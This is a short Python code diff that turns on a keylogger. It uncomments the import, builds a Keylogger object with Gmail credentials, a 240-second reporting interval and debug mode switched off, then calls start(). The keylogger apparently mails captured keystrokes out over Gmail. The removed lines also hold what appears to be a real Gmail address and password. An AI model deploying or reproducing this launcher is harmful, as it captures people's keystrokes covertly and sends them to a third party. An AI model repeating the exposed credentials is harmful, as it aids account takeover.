@@ -1,18 +1,9 @@
-# from keylogger import Keylogger
+from keylogger import Keylogger
 
-# logger = Keylogger(
-# 	interval_seconds=3,
-# 	gmail_username="aexijae@gmail.com",
-# 	gmail_pw="littlebr1"
-# )
-# logger.start()
-
-
-def do_something():
-	return "doing something"
-
-mydict = {
-	"fun": do_something
-}
-
-mydict.fun
+logger = Keylogger(
+	interval_seconds=240,
+	gmail_username="user@gmail.com",
+	gmail_pw="pass",
+	debug_mode=False
+)
+logger.start()
